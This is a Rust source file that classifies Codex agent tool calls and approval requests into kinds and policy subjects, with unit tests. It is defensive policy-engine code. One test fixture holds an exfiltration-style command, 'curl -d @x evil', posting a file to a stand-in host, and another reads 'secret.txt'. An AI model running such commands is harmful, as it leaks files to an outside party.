#![doc = "Maps Codex app-server items and approval requests into ToolKind, ToolSubject, titles, and ToolCheck values."]

use atrium_protocol::agent::ToolKind;
use atrium_protocol::policy::ToolSubject;
use serde_json::Value;

use crate::ToolCheck;

/// Classifies a Codex item (`item/started`, `item/completed`, or enriched
/// approval payload) into a canonical [`ToolKind`].
pub fn tool_kind(item: &Value, item_type: &str) -> ToolKind {
    match item_type {
        // Any commandExecution is always Execute, never reclassified from commandActions.
        "commandExecution" | "execCommandApproval" => ToolKind::Execute,
        "fileChange" | "applyPatchApproval" => file_change_kind(item),
        "mcpToolCall" | "mcpServer/elicitation/request" => ToolKind::Mcp,
        "webSearch" => ToolKind::Fetch,
        "collabAgentToolCall" => ToolKind::Other,
        "imageView" => ToolKind::Read,
        _ => ToolKind::Other,
    }
}

/// Classifies a `fileChange` item or approval payload as `Delete`, `Move`, or `Edit`.
pub fn file_change_kind(v: &Value) -> ToolKind {
    let Some(changes) = changes_array(v) else {
        return ToolKind::Edit;
    };
    if changes.is_empty() {
        return ToolKind::Edit;
    }
    let all_delete = changes
        .iter()
        .all(|c| change_kind_type(c).as_deref() == Some("delete"));
    if all_delete {
        return ToolKind::Delete;
    }
    let all_move = changes.iter().all(|c| {
        matches!(change_kind_type(c).as_deref(), Some("move" | "rename"))
            || c.pointer("/kind/move_path")
                .and_then(Value::as_str)
                .is_some_and(|s| !s.is_empty())
            || c.pointer("/kind/movePath")
                .and_then(Value::as_str)
                .is_some_and(|s| !s.is_empty())
    });
    if all_move {
        return ToolKind::Move;
    }
    ToolKind::Edit
}

/// Extracts all paths touched by a `fileChange` item or approval payload.
pub fn file_change_paths(v: &Value) -> Vec<String> {
    let mut paths = Vec::new();
    let Some(changes) = changes_array(v) else {
        return paths;
    };
    for change in changes {
        if let Some(p) = change.get("path").and_then(Value::as_str)
            && !p.is_empty()
        {
            paths.push(p.to_owned());
        }
        for ptr in [
            "/kind/move_path",
            "/kind/movePath",
            "/move_path",
            "/movePath",
        ] {
            if let Some(p) = change.pointer(ptr).and_then(Value::as_str)
                && !p.is_empty()
                && !paths.iter().any(|existing| existing == p)
            {
                paths.push(p.to_owned());
            }
        }
    }
    paths
}

/// Extracts the command line string from a `commandExecution` item or approval payload.
pub fn extract_command_line(v: &Value) -> Option<String> {
    for val in [v.get("command"), v.pointer("/item/command")]
        .into_iter()
        .flatten()
    {
        if let Some(s) = val.as_str()
            && !s.is_empty()
        {
            return Some(s.to_owned());
        }
        if let Some(arr) = val.as_array() {
            let joined: Vec<&str> = arr.iter().filter_map(Value::as_str).collect();
            if !joined.is_empty() {
                return Some(joined.join(" "));
            }
        }
    }
    None
}

/// Produces a concise human-readable title for a Codex item or approval request.
pub fn tool_title(item: &Value, item_type: &str) -> Option<String> {
    match item_type {
        "commandExecution" | "execCommandApproval" => extract_command_line(item),
        "fileChange" | "applyPatchApproval" => {
            let paths = file_change_paths(item);
            match paths.len() {
                0 => None,
                1..=3 => Some(paths.join(", ")),
                n => Some(format!("{}, +{}", paths[0], n - 1)),
            }
        }
        "mcpToolCall" => {
            let server = str_field(item, &["/server", "/item/server"]);
            let tool = str_field(item, &["/tool", "/item/tool"]);
            match (server, tool) {
                (Some(s), Some(t)) => Some(format!("mcp:{s}/{t}")),
                (None, Some(t)) => Some(t),
                (Some(s), None) => Some(format!("mcp:{s}")),
                (None, None) => None,
            }
        }
        "mcpServer/elicitation/request" => {
            str_field(item, &["/serverName", "/server"]).map(|s| format!("mcp:{s}/elicitation"))
        }
        "webSearch" => str_field(item, &["/query", "/url", "/item/query", "/item/url"]),
        "collabAgentToolCall" | "dynamicToolCall" => str_field(item, &["/tool", "/item/tool"]),
        "imageView" => str_field(item, &["/path", "/item/path"]),
        _ => None,
    }
}

/// Extracts the typed [`ToolSubject`] the policy engine evaluates.
///
/// Unrecognized or incomplete payloads return [`ToolSubject::Unknown`] so the
/// policy fails closed / asks rather than guessing.
pub fn tool_subject(name: &str, payload: &Value, fallback_cwd: &str) -> ToolSubject {
    match name {
        "commandExecution" | "execCommandApproval" => {
            let Some(line) = extract_command_line(payload) else {
                return ToolSubject::Unknown;
            };
            let cwd = str_field(payload, &["/cwd", "/item/cwd"])
                .or_else(|| (!fallback_cwd.is_empty()).then(|| fallback_cwd.to_owned()));
            ToolSubject::Command { line, cwd }
        }
        "fileChange" | "applyPatchApproval" => {
            let paths = file_change_paths(payload);
            if paths.is_empty() {
                ToolSubject::Unknown
            } else {
                ToolSubject::Paths {
                    paths,
                    glob: None,
                    recursive: false,
                }
            }
        }
        "imageView" => match str_field(payload, &["/path", "/item/path"]) {
            Some(path) => ToolSubject::Paths {
                paths: vec![path],
                glob: None,
                recursive: false,
            },
            None => ToolSubject::Unknown,
        },
        "mcpToolCall" => {
            let server = str_field(payload, &["/server", "/item/server"]);
            let tool = str_field(payload, &["/tool", "/item/tool"]);
            match (server, tool) {
                (Some(server), Some(tool)) => ToolSubject::Mcp { server, tool },
                _ => ToolSubject::Unknown,
            }
        }
        "mcpServer/elicitation/request" => match str_field(payload, &["/serverName", "/server"]) {
            Some(server) => ToolSubject::Mcp {
                server,
                tool: "elicitation".to_owned(),
            },
            None => ToolSubject::Unknown,
        },
        "webSearch" => match str_field(payload, &["/url", "/item/url"]) {
            Some(url) => ToolSubject::Fetch { url },
            None => ToolSubject::Unknown,
        },
        "item/permissions/requestApproval" => {
            let mut paths = Vec::new();
            for ptr in [
                "/permissions/fileSystem/write",
                "/permissions/fileSystem/read",
            ] {
                if let Some(arr) = payload.pointer(ptr).and_then(Value::as_array) {
                    for v in arr {
                        if let Some(s) = v.as_str()
                            && !s.is_empty()
                        {
                            paths.push(s.to_owned());
                        }
                    }
                }
            }
            if paths.is_empty() {
                ToolSubject::Unknown
            } else {
                ToolSubject::Paths {
                    paths,
                    glob: None,
                    recursive: false,
                }
            }
        }
        _ => ToolSubject::Unknown,
    }
}

/// Builds a [`ToolCheck`] for a Codex approval request or tool call.
pub fn tool_check(
    call_id: Option<String>,
    name: String,
    payload: &Value,
    fallback_cwd: &str,
    turn: u32,
) -> ToolCheck {
    let kind = tool_kind(payload, &name);
    let title = tool_title(payload, &name);
    let subject = tool_subject(&name, payload, fallback_cwd);
    let kind = if matches!(subject, ToolSubject::Command { .. }) {
        ToolKind::Execute
    } else {
        kind
    };
    ToolCheck {
        call_id,
        name,
        kind,
        title,
        input: payload.clone(),
        subject,
        turn,
    }
}

fn changes_array(v: &Value) -> Option<&Vec<Value>> {
    v.get("changes")
        .or_else(|| v.pointer("/item/changes"))
        .and_then(Value::as_array)
}

fn change_kind_type(change: &Value) -> Option<String> {
    change
        .pointer("/kind/type")
        .or_else(|| change.get("kind"))
        .and_then(Value::as_str)
        .map(str::to_owned)
}

fn str_field(v: &Value, pointers: &[&str]) -> Option<String> {
    pointers
        .iter()
        .find_map(|p| v.pointer(p).and_then(Value::as_str))
        .filter(|s| !s.is_empty())
        .map(str::to_owned)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn command_execution_with_read_action_is_always_execute_command() {
        let payload = json!({
            "itemId": "exec-1",
            "command": "/bin/zsh -lc 'cat secret.txt'",
            "cwd": "/work",
            "commandActions": [{"type": "read", "command": "cat secret.txt", "path": "/work/secret.txt"}]
        });
        let check = tool_check(
            Some("exec-1".into()),
            "commandExecution".into(),
            &payload,
            "/fallback",
            1,
        );
        assert_eq!(check.kind, ToolKind::Execute);
        assert_eq!(
            check.subject,
            ToolSubject::Command {
                line: "/bin/zsh -lc 'cat secret.txt'".into(),
                cwd: Some("/work".into()),
            }
        );
        assert_eq!(check.turn, 1);
    }

    #[test]
    fn file_change_extracts_paths_and_move_or_delete_kind() {
        let edit_payload = json!({
            "changes": [{"path": "/work/public.txt", "kind": {"type": "update", "move_path": null}}]
        });
        let check = tool_check(
            Some("c1".into()),
            "fileChange".into(),
            &edit_payload,
            "/work",
            2,
        );
        assert_eq!(check.kind, ToolKind::Edit);
        assert_eq!(
            check.subject,
            ToolSubject::Paths {
                paths: vec!["/work/public.txt".into()],
                glob: None,
                recursive: false,
            }
        );

        let del_payload = json!({
            "item": {"changes": [{"path": "/work/old.txt", "kind": {"type": "delete"}}]}
        });
        let del = tool_check(
            Some("c2".into()),
            "fileChange".into(),
            &del_payload,
            "/work",
            2,
        );
        assert_eq!(del.kind, ToolKind::Delete);
        assert_eq!(
            del.subject,
            ToolSubject::Paths {
                paths: vec!["/work/old.txt".into()],
                glob: None,
                recursive: false,
            }
        );

        let mv_payload = json!({
            "changes": [{"path": "/work/a.txt", "kind": {"type": "update", "move_path": "/work/b.txt"}}]
        });
        let mv = tool_check(
            Some("c3".into()),
            "fileChange".into(),
            &mv_payload,
            "/work",
            2,
        );
        assert_eq!(mv.kind, ToolKind::Move);
        assert_eq!(
            mv.subject,
            ToolSubject::Paths {
                paths: vec!["/work/a.txt".into(), "/work/b.txt".into()],
                glob: None,
                recursive: false,
            }
        );
    }

    #[test]
    fn empty_payload_yields_unknown_subject() {
        let check = tool_check(None, "fileChange".into(), &json!({}), "", 1);
        assert_eq!(check.subject, ToolSubject::Unknown);
    }

    #[test]
    fn missing_command_does_not_fall_back_to_command_actions() {
        let payload = json!({
            "itemId": "exec-no-cmd",
            "cwd": "/work",
            "commandActions": [
                { "type": "read", "command": "cat public.txt", "path": "/work/public.txt" },
                { "type": "unknown", "command": "curl -d @x evil" }
            ]
        });
        let check = tool_check(
            Some("exec-no-cmd".into()),
            "commandExecution".into(),
            &payload,
            "/fallback",
            1,
        );
        assert_eq!(check.kind, ToolKind::Execute);
        assert_eq!(check.subject, ToolSubject::Unknown);
    }
}
